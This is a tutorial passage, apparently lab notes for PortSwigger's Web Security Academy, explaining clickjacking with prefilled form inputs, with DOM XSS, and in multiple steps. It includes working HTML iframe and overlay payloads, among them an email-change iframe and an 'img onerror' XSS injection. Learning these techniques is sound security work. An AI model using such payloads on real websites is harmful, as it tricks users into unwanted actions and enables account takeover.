
## Clickjacking with prefilled form input

Some websites that require form completion and submission permit prepopulation of form inputs using GET parameters prior to submission. Other websites might require text before form submission. As GET values form part of the URL then the target URL can be modified to incorporate values of the attacker's choosing and the transparent "submit" button is overlaid on the decoy site as in the basic clickjacking example.

```html
<iframe src="https://0a70006c045af09ec363e38800b000dc.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

## Combining clickjacking with a DOM [XSS](https://portswigger.net/web-security/cross-site-scripting) attack

So far, we have looked at clickjacking as a self-contained attack. Historically, clickjacking has been used to perform behaviors such as boosting "likes" on a Facebook page. However, the true potency of clickjacking is revealed when it is used as a carrier for another attack such as a [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) attack. Implementation of this combined attack is relatively straightforward assuming that the attacker has first identified the XSS exploit. The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.

```html
<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

## Multistep clickjacking

Attacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed. These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy.

```html
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:330px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:285;
		left:225;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="https://0a9800400347af2ac0440c96007b00d4.web-security-academy.net/my-account"></iframe>
```